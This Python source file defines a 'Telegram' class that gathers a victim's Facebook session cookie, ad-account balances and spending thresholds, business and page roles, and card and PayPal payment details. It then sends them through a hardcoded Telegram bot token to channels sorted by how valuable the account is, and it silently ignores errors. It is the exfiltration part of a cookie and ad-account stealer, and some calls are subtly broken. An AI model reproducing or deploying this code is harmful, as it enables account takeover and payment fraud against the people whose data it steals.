import requests


class Telegram:
    def __init__(self):
        self.TELEGRAM_API = 'https://api.telegram.org/bot'
        self.TELEGRAM_BOT_API = f'{self.TELEGRAM_API}5219406437:AAFHGE-fOD5bnFl2ae9ZX68rtxpzDZaV6T8'

        self.TELEGRAM_CHANNEL_WORLD_AGENCY = '-1001480682955'
        self.TELEGRAM_CHANNEL_BIG_WORLD_AGENCY = '-1001598526649'

        self.CURRENCY_API = 'https://open.er-api.com/v6/latest/USD'
        self.CURRENCY_RATE = self.apiGetCurrencyRateUSD()

        self.MIN_THRESHOLD = 50.0

    def apiGetCurrencyRateUSD(self):
        return requests.get(self.CURRENCY_API).json()['rates']

    def apiGetConvertToUSD(self, value, currency):
        return value * 1.0 / self.CURRENCY_RATE[currency]

    def apiSendMessage(self, cookieDecode, values):
        try:
            if not self.apiGetIsActivateAndThresholdOnAdaccount(values['adaccounts']):
                return

            UID = values['me']['id']
            adaccounts = self.apiGetAdaccounts(values['adaccounts'])
            businesses = self.apiGetBusinesses(values['businesses'])[:3]
            pages = self.apiGetPages(values['pages'], UID)[:3]

            messageTextAdaccounts = self.apiGetMessageAdaccounts(
                adaccounts, UID)
            messageTextBusiness = self.apiGetMessageBusiness(businesses)
            messageTextPages = self.apiGetMessagePages(pages, UID)

            messageText = f"\
*[ Adaccounts ][ {len(values['adaccounts'])} ]*\n\
{messageTextAdaccounts}\n\
*[ Businesses ][ {len(values['businesses'])} ]*\n\
{messageTextBusiness}\n\
*[ Pages ][ {len(values['pages'])} ]*\n\
{messageTextPages}\n\
*[ About ][ {values['me']['name']} ]*\n\
```\nUID: {values['me']['id']}\n```\
```\nName: {values['me']['name']}\n```\
```\nGender: {values['me']['gender']}\n```\
```\nFriends: {values['me']['friends']['summary']['total_count']}\n```\
```\nSessions: {', '.join(values['sessions'][:3])}\n```\n\
*[ Cookie ]*\n\
```\n{cookieDecode}\n```\
            ".strip()

            api = requests.Session()
            chatId = self.TELEGRAM_CHANNEL_WORLD_AGENCY
            if self.apiGetNeedSendMessageToBigChannel(values['adaccounts']):
                chatId = self.TELEGRAM_CHANNEL_BIG_WORLD_AGENCY
            _ = api.get(
                f'{self.TELEGRAM_BOT_API}/sendMessage?chat_id={chatId}&parse_mode=markdown&text={messageText}'
            )
        except Exception:
            pass

    def apiGetIsActivateAndThresholdOnAdaccount(self, adaccounts):
        for adaccount in adaccounts:
            if self.apiGetAccountStatusOnAdaccount(adaccount) == 'ACTIVE':
                if self.apiGetThresholdOnAdaccount(adaccount) > 0:
                    return True
        return False

    def apiGetNeedSendMessageToBigChannel(self, adaccounts):
        for adaccount in adaccounts:
            if self.apiGetAccountStatusOnAdaccount(adaccount) == 'ACTIVE':
                threshold = self.apiGetThresholdOnAdaccount(adaccount)
                if self.apiGetConvertToUSD(threshold) >= self.MIN_THRESHOLD:
                    return True
        return False

    def apiGetMessageAdaccounts(self, adaccounts, UID):
        messageTextList = []
        for adaccount in adaccounts:
            lineOne = f"```\n[{self.apiGetAccountStatusOnAdaccount(adaccount)}][Threshold: {self.apiGetThresholdOnAdaccount(adaccount)} {adaccount['currency']}, Spent: {self.apiGetSpentOnAdaccount(adaccount)} {adaccount['currency']}, Balance: {self.apiGetBalanceOnAdaccount(adaccount)} {adaccount['currency']}, Limit/Day: {adaccount['adtrust_dsl']} {adaccount['currency']}] => [Id: {adaccount['account_id']}, Role: {self.apiGetRoleOnAdaccount(adaccount, UID)}, Business: {self.apiGetBusinessOnAdaccount(adaccount)}, Users: {self.apiGetUsersOnAdaccount(adaccount)}, Ads Running: {self.apiGetAdsVolumeOnAdaccount(adaccount)}, Notifications: {self.apiGetNotificationsOnAdaccount(adaccount)}]\n```"
            lineTwo = f"```\n{self.apiGetPaymentsOnAdaccount(adaccount)}\n```"
            messageTextList.append(
                f"{lineOne}{lineTwo}"
            )
        return '\n'.join(messageTextList)

    def apiGetMessageBusiness(self, businesses):
        messageTextList = []
        for business in businesses:
            messageTextList.append(
                f"```\n[Adaccount: {self.apiGetAdaccountOnBusiness(business)}, Admins: {self.apiGetUsersAdminOnBusiness(business)}, Users: {self.apiGetUsersOnBusiness(business)}] => [Id: {business['id']}, Created: {business['created_time']}]\n```"
            )
        return ''.join(messageTextList)

    def apiGetMessagePages(self, pages, UID):
        messageTextList = []
        for page in pages:
            messageTextList.append(
                f"```\n[Role: {self.apiGetRoleOnPage(page, UID)}, Likes: {page['fan_count']}, Followers: {page['followers_count']}] => [Id: {page['id']}, Created: {page['page_created_time']}]\n```"
            )
        return ''.join(messageTextList)

    def apiGetAdaccounts(self, adaccounts):
        adaccounts_fixed = []
        for adaccount in adaccounts:
            if self.apiGetAccountStatusOnAdaccount(adaccount) == 'ACTIVE':
                if self.apiGetThresholdOnAdaccount(adaccount) > 0:
                    adaccounts_fixed.append(adaccount)
        return sorted(
            adaccounts_fixed,
            key=lambda adaccount: self.apiGetThresholdOnAdaccount(adaccount),
            reverse=True
        )

    def apiGetBusinesses(self, businesses):
        businesses_fixed = []
        for business in businesses:
            if self.apiGetOwnedAdAccountsOnBusiness(business) > 0:
                businesses_fixed.append(business)
        return sorted(
            businesses_fixed,
            key=lambda business: self.apiGetOwnedAdAccountsOnBusiness(
                business),
            reverse=True
        )

    def apiGetPages(self, pages, UID):
        pages_fixed = []
        for page in pages:
            if self.apiGetRoleOnPage(page, UID) == 'Admin':
                pages_fixed.append(page)
        return sorted(
            pages_fixed,
            key=lambda page: page['fan_count'],
            reverse=True
        )

    def apiGetAccountStatusOnAdaccount(self, adaccount):
        if adaccount['account_status'] == 1:
            return 'ACTIVE'
        if adaccount['account_status'] == 2:
            return 'DISABLED'
        if adaccount['account_status'] == 3:
            return 'UNSETTLED'
        if adaccount['account_status'] == 7:
            return 'PENDING_RISK_REVIEW'
        if adaccount['account_status'] == 8:
            return 'PENDING_SETTLEMENT'
        if adaccount['account_status'] == 9:
            return 'IN_GRACE_PERIOD'
        if adaccount['account_status'] == 100:
            return 'PENDING_CLOSURE'
        if adaccount['account_status'] == 101:
            return 'CLOSED'
        if adaccount['account_status'] == 201:
            return 'ANY_ACTIVE'
        if adaccount['account_status'] == 202:
            return 'ANY_CLOSED'
        return '-'

    def apiGetOffsetCurrency(self, adaccount):
        if adaccount['currency'] in ['CLP', 'COP', 'CRC', 'HUF', 'ISK', 'IDR', 'JPY', 'KRW', 'PYG', 'TWD', 'VND']:
            return 1.0
        return 100.0

    def apiGetThresholdOnAdaccount(self, adaccount):
        threshold = 0
        if 'adspaymentcycle' in adaccount:
            threshold = adaccount['adspaymentcycle']['data'][0]['threshold_amount']
        return threshold * 1.0 / self.apiGetOffsetCurrency(adaccount)

    def apiGetOwnedAdAccountsOnBusiness(self, business):
        if 'owned_ad_accounts' in business:
            return len(business['owned_ad_accounts']['data'])
        return 0

    def apiGetRoleOnPage(self, page, UID):
        if 'roles' in page:
            for user in page['roles']['data']:
                if user['id'] == UID:
                    return user['role']
        return '-'

    def apiGetSpentOnAdaccount(self, adaccount):
        return int(adaccount['amount_spent']) * 1.0 / self.apiGetOffsetCurrency(adaccount)

    def apiGetBalanceOnAdaccount(self, adaccount):
        return int(adaccount['balance']) * 1.0 / self.apiGetOffsetCurrency(adaccount)

    def apiGetRoleOnAdaccount(self, adaccount, UID):
        me = next(
            user for user in adaccount['users']['data'] if user['id'] == UID)
        if me['role'] == 1001:
            return 'ADMIN'
        elif me['role'] == 1002:
            return 'ADVERTISER'
        else:
            return 'ANALYST'

    def apiGetBusinessOnAdaccount(self, adaccount):
        if 'business' in adaccount:
            return adaccount['business']['name']
        return '-'

    def apiGetUsersOnAdaccount(self, adaccount):
        return len(adaccount['users']['data'])

    def apiGetAdsVolumeOnAdaccount(self, adaccount):
        if 'ads_volume' in adaccount:
            if len(adaccount['ads_volume']['data']) > 0:
                return adaccount['ads_volume']['data'][0]['ads_running_or_in_review_count']
        return 0

    def apiGetNotificationsOnAdaccount(self, adaccount):
        if adaccount['is_notifications_enabled'] is True:
            return 'ON'
        return 'OFF'

    def apiGetUsersOnBusiness(self, business):
        return len(filter(
            lambda user: user['role'] != 'ADMIN',
            business['business_users']['data']
        ))

    def apiGetUsersAdminOnBusiness(self, business):
        return len(filter(
            lambda user: user['role'] == 'ADMIN',
            business['business_users']['data']
        ))

    def apiGetAdaccountOnBusiness(self, business):
        if 'owned_ad_accounts' in business:
            return len(business['owned_ad_accounts']['data'])
        return 0

    def apiGetPaymentsOnAdaccount(self, adaccount):
        payments = []
        if 'all_payment_methods' in adaccount:
            if 'pm_credit_card' in adaccount['all_payment_methods']:
                for payment in adaccount['all_payment_methods']['pm_credit_card']['data']:
                    payments.append(
                        f"[{payment['display_string']}] => [Expired: {payment['exp_month']}/{payment['exp_year']}, Created: {payment['time_created']}]"
                    )
            if 'payment_method_paypal' in adaccount['all_payment_methods']:
                for payment in adaccount['all_payment_methods']['payment_method_paypal']['data']:
                    payments.append(
                        f"[PAYPAL] => [Email: {payment['email_address']}, Created: {payment['time_created']}]"
                    )
            if 'payment_method_stored_balances' in adaccount['all_payment_methods']:
                for payment in adaccount['all_payment_methods']['payment_method_stored_balances']['data']:
                    payments.append(
                        f"[PREPAID] => [Balance: {payment['balance']['amount']}, Total Fundings: {payment['total_fundings']['amount']}, Created: {payment['time_created']}]"
                    )
            return '\n'.join(payments)
        return '-'
